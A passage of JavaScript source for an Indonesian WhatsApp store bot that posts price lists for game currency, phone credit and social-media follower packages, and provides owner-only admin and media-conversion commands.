┃💳𝟽𝟶𝙺 = 𝗥𝗽.𝟳𝟯.𝟬𝟬𝟬
┃💳𝟾𝟶𝙺 = 𝗥𝗽.𝟴𝟯.𝟬𝟬𝟬
┃💳𝟿𝟶𝙺 = 𝗥𝗽.𝟵𝟯.𝟬𝟬𝟬
┃💳𝟷𝟶𝟶𝙺 = 𝗥𝗽.𝟭𝟬𝟯.𝟬𝟬𝟬
┃💳𝟸𝟶𝟶𝙺 = 𝗥𝗽.𝟮𝟬𝟬𝟱.𝟬𝟬𝟬
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'bayarqris':{
GpStore.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]}

Sɪʟᴀʜᴋᴀɴ Sᴄᴀɴ Qʀɪs Dɪ Aᴛᴀs Uɴᴛᴜᴋ Bᴀʏᴀʀ Dᴀɴ Kɪʀɪᴍ Bᴜᴋᴛɪ Tғ Kᴇ Aᴅᴍɪɴ
https://wa.me/62858428854987 .`, mentions: [sender]},{quoted:m})
}
break
case 'diamondff':{
GpStore.sendMessage(from,{image:freefire, caption:`Hai Kak @${sender.split("@")[0]}

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 llı 𝗙𝗥𝗘𝗘 𝗙𝗜𝗥𝗘 ıll 〕ꕥ━⬣
┃💎𝟻𝟶 = 𝗥𝗽. 
┃💎𝟽𝟶 = 𝗥𝗽. 
┃💎𝟷𝟶𝟶 = 𝗥𝗽. 
┃💎𝟷𝟺𝟶 = 𝗥𝗽. 
┃💎𝟸𝟷𝟶 = 𝗥𝗽. 
┃💎𝟹𝟻𝟻 = 𝗥𝗽. 
┃💎𝟻𝟶𝟶 = 𝗥𝗽. 
┃💎𝟽𝟸𝟶 = 𝗥𝗽. 
┃💎𝟷𝟶𝟶𝟶 = 𝗥𝗽.
┃💎𝟷𝟺𝟻𝟶 = 𝗥𝗽. 
┃💎𝟸𝟷𝟾𝟶 = 𝗥𝗽. 
┃💎𝟹𝟼𝟺𝟶 = 𝗥𝗽. 
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'diamondml':{
GpStore.sendMessage(from,{image:ml, caption:`Hai Kak @${sender.split("@")[0]}

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 llı 𝗠𝗢𝗕𝗜𝗟𝗘 𝗟𝗘𝗚𝗘𝗡𝗗𝗦 ıll 〕ꕥ━⬣
┃💎𝟸𝟾 = 𝗥𝗽.
┃💎𝟹𝟼 = 𝗥𝗽.
┃💎𝟺𝟺 = 𝗥𝗽.
┃💎𝟾𝟼 = 𝗥𝗽.
┃💎𝟷𝟷𝟸 = 𝗥𝗽.
┃💎𝟷𝟽𝟸 = 𝗥𝗽.
┃💎𝟷𝟾𝟻 = 𝗥𝗽.
┃💎𝟸𝟻𝟽 = 𝗥𝗽.
┃💎𝟸𝟾𝟺 = 𝗥𝗽.
┃💎𝟹𝟺𝟺 = 𝗥𝗽.
┃💎𝟺𝟸𝟿 = 𝗥𝗽.
┃💎𝟻𝟷𝟺 = 𝗥𝗽.
┃💎𝟼𝟶𝟶 = 𝗥𝗽.
┃💎𝟽𝟶𝟼 = 𝗥𝗽.
┃💎𝟾𝟽𝟾 = 𝗥𝗽.
┃💎𝟿𝟼𝟹 = 𝗥𝗽.
┃💎𝟷𝟶𝟷𝟶 = 𝗥𝗽.
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'diamondpubg':{
GpStore.sendMessage(from,{image:pubg, caption:`Hai Kak @${sender.split("@")[0]}

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ıll 〕ꕥ━⬣
┃💸𝟹𝟻 𝚄𝙲 = 𝗥𝗽.𝟭𝟬.𝟬𝟬𝟬
┃💸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟮.𝟬𝟬𝟬
┃💸𝟽𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟲.𝟬𝟬𝟬
┃💸𝟷𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟮𝟭.𝟬𝟬𝟬
┃💸𝟷𝟸𝟻 𝚄𝙲 = 𝗥𝗽.𝟮𝟱.𝟬𝟬𝟬
┃💸𝟷𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟯𝟮.𝟬𝟬𝟬
┃💸𝟸𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟰𝟬.𝟬𝟬𝟬
┃💸𝟸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟰𝟴.𝟬𝟬𝟬
┃💸𝟹𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟱𝟴.𝟬𝟬𝟬
┃💸𝟹𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟲𝟲.𝟬𝟬𝟬
┃💸𝟽𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟯𝟮.𝟬𝟬𝟬
┃💸𝟽𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟰𝟬.𝟬𝟬𝟬
┃💸𝟷𝟶𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟴𝟱.𝟬𝟬𝟬
┃💸𝟷𝟸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟮𝟰𝟱.𝟬𝟬𝟬
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'diamondcalof':{
GpStore.sendMessage(from,{image:calof, caption:`Hai Kak @${sender.split("@")[0]}

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 𝗣𝗨𝗕𝗚 𝗠𝗢𝗕𝗜𝗟𝗘 ıll 〕ꕥ━⬣
┃💸𝟹𝟻 𝚄𝙲 = 𝗥𝗽.𝟭𝟬.𝟬𝟬𝟬
┃💸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟮.𝟬𝟬𝟬
┃💸𝟽𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟲.𝟬𝟬𝟬
┃💸𝟷𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟮𝟭.𝟬𝟬𝟬
┃💸𝟷𝟸𝟻 𝚄𝙲 = 𝗥𝗽.𝟮𝟱.𝟬𝟬𝟬
┃💸𝟷𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟯𝟮.𝟬𝟬𝟬
┃💸𝟸𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟰𝟬.𝟬𝟬𝟬
┃💸𝟸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟰𝟴.𝟬𝟬𝟬
┃💸𝟹𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟱𝟴.𝟬𝟬𝟬
┃💸𝟹𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟲𝟲.𝟬𝟬𝟬
┃💸𝟽𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟯𝟮.𝟬𝟬𝟬
┃💸𝟽𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟰𝟬.𝟬𝟬𝟬
┃💸𝟷𝟶𝟶𝟶 𝚄𝙲 = 𝗥𝗽.𝟭𝟴𝟱.𝟬𝟬𝟬
┃💸𝟷𝟸𝟻𝟶 𝚄𝙲 = 𝗥𝗽.𝟮𝟰𝟱.𝟬𝟬𝟬
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'buypulsa':{
GpStore.sendMessage(from,{image:pulsa, caption:`Hai Kak @${sender.split("@")[0]}

❍ 𝗣𝗨𝗟𝗦𝗔 𝗡𝗔𝗦𝗜𝗢𝗡𝗔𝗟
𝙼𝚒𝚗𝚊𝚝? wa.me/6281390368580

┏━━━━━━━━━━━━━━━━━━━ꕥ
┃❖ 𝙿𝚄𝙻𝚂𝙰    𝟻.𝟶𝟶𝟶 = 𝗥𝗽.𝟳.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰    𝟷𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟭𝟮.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰    𝟷𝟻.𝟶𝟶𝟶 = 𝗥𝗽.𝟭𝟳.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟸𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟮𝟮.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟸𝟻.𝟶𝟶𝟶 = 𝗥𝗽.𝟮𝟳.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟹𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟯𝟮.𝟬𝟬𝟬	
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟹𝟻.𝟶𝟶𝟶 = 𝗥𝗽.𝟯𝟳.𝟬𝟬𝟬	
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟺𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟰𝟮.𝟬𝟬𝟬		
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟺𝟻.𝟶𝟶𝟶 = 𝗥𝗽.𝟰𝟳.𝟬𝟬𝟬	
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟻𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟱𝟮.𝟬𝟬𝟬
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟷𝟶𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟭𝟬𝟮.𝟬𝟬𝟬
┃❖ 𝙿𝚄𝙻𝚂𝙰 	𝟸𝟶𝟶.𝟶𝟶𝟶 = 𝗥𝗽.𝟮𝟬𝟮.𝟬𝟬𝟬
┗━━━━━━━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'suntiktiktok':{
GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}

𝗝𝗔𝗦𝗔 𝗦𝗨𝗡𝗧𝗜𝗞 𝗧𝗜𝗞 𝗧𝗢𝗞
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷
    
┏━ꕥ〔 llı 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟷𝙺 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┗━ꕥ

┏━ꕥ〔 llı 𝗟𝗜𝗞𝗘 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟷𝙺 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┗━ꕥ

┏━ꕥ〔 llı 𝗩𝗜𝗘𝗪 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟷𝙺 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'suntikig':{
GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}

𝗝𝗔𝗦𝗔 𝗦𝗨𝗡𝗧𝗜𝗞 𝗜𝗦𝗧𝗔𝗚𝗥𝗔𝗠
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 llı 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┃𝟷𝙺 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 = 𝗥𝗽.
┗━ꕥ

┏━ꕥ〔 llı 𝗟𝗜𝗞𝗘 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┃𝟷𝙺 𝙻𝙸𝙺𝙴 = 𝗥𝗽.
┗━ꕥ

┏━ꕥ〔 llı 𝗩𝗜𝗘𝗪 llı  〕ꕥ━⬣
┃𝟷𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟸𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟺𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟻𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟼𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟽𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟾𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟿𝟶𝟶 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┃𝟷𝙺 𝚅𝙸𝙴𝚆 = 𝗥𝗽.
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'addprem':
if (!itsMeGpStore) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await GpStore.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
break
case 'delprem':
if (!itsMeGpStore) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
break
case 'addvn':{
if (!itsMeGpStore) return reply(mess.owner)
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(q)) return reply("Nama tersebut sudah di gunakan")
let delb = await GpStore.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case 'delvn':{
if (!itsMeGpStore) return reply(mess.owner)
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(q)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Sukses delete vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓�? *LIST VN* 」\n│\n'
for (let x of vnnye) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${vnnye.length}*`
reply(teks)
}
break
case 'addowner':
if (!itsMeGpStore) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await GpStore.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (!itsMeGpStore) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62858428854987`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'listpremium':
teks = '*List Premium*\n\n'
for (let GpStore of prem) {
teks += `- ${GpStore}\n`
}
teks += `\n*Total : ${prem.length}*`
GpStore.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setppbot': {
if (!itsMeGpStore) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await GpStore.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/kay`) {
var { img } = await generateProfilePicture(medis)
await GpStore.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Sukses`)
} else {
var memeg = await GpStore.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Sukses`)
}
}
break
case 'listnya':
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessageNya = {
text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
footer: "List By GpStore",
buttonText: "Click Here",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsge = await GpStore.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!itsMeGpStore) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
media = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case 'dellist':
if (!itsMeGpStore) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'updatelist':
if (!itsMeGpStore) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
media = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses update list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'snobg': {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await GpStore.downloadAndSaveMediaMessage(quoted)
let encmedia = await GpStore.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
}
}
break
case 'tourl':
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
mee = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
GpStore.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'gay':
case 'jail':
try {
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
meeh = await GpStore.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
GpStore.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'tovn':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
mee = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
GpStore.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
mee = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
GpStore.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
mee = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
GpStore.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyaimg, mentions:[sender] }, {quoted:m})
break
case 'smeme':
if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!isMedia) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
mee = await GpStore.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
GpStore.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break
case 'cekme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
					var hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget kek mimin😍','�?','✔️']
					var wetak= ['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
